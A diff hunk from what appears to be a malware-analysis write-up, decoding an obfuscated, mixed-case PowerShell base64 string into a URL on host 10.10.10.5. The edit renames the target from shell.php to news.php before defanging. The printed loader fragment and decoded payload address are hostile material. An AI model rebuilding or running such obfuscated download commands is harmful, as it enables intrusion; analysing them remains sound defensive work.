@@ -201,7 +201,7 @@ UnicodE.GetStriNG([CoNVeRT]::FroMBASe64StRInG('aAB0AHQAcAA6AC8ALwAxADAALgAxADAAL
 another way (from base64, decode text UTF-16LE)
 ---
 
-so finally is: http://10.10.10.5/shell.php
+so finally is: http://10.10.10.5/news.php
 
 now defanging url
 
